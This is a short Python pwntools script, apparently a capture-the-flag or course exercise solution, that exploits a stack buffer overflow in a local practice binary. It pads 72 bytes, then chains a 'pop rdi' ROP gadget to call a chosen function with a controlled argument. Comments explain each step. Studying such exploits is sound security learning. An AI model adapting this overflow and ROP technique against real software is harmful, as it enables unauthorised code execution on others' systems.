#!/usr/bin/env python3

from pwn import *
target = process("./bin/ex2")

dream_msg_address = 0x401166

souldream_address = 0x404080

get_hacked = b"GETHACKEDLOL"

# Buffer overflow until we reach the point in memory where we can overwrite the return address -> 72 bytes (6 * 12 = 72)
payload = get_hacked * 6 

# Now we need to find a ROP gadget that pops a value into the rdi register
# We can use this: 0x000000000040124f : pop rdi ; pop rbp ; ret
# Note that we have an extra pop rbp; we can just put a junk value there

pop_rdi_gadget = 0x40124f

payload += p64(pop_rdi_gadget, "little") + p64(souldream_address, "little") + b"A" * 8 + p64(dream_msg_address, "little")

target.send(payload)
target.interactive()
